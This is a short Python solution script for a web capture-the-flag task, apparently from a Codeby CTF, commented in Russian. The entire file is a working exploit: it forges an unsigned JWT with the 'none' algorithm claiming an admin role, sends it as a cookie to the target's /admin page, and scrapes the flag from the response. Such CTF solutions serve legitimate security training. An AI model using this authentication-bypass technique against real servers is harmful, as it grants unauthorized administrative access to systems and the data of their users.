# для решения таска из категории Веб "Жёсткий Type"

import base64
import requests
import pyperclip
import html

HOST = 'http://TASK_URL'
JWT_HEADER = base64.urlsafe_b64encode('{"alg":"none","typ":"JWT"}'.encode()).replace(b'=', b'')
JWT_PAYLOAD = base64.urlsafe_b64encode('{"username":"admin","role":"admin","exp":1000000}'.encode()).replace(b'=', b'')
TOKEN = JWT_HEADER + b'.' + JWT_PAYLOAD + b'.'
cookies = {'token': TOKEN.decode()}

response = requests.get(f'{HOST}/admin', cookies=cookies)

if 'CODEBY{' in response.text:

    flag = "CODEBY{" + html.unescape(response.text.split('CODEBY{')[1].split('}')[0]) + "}"

    print(f'flag: {flag}')
    pyperclip.copy(f'{flag}')
    
else: print('flag not found')
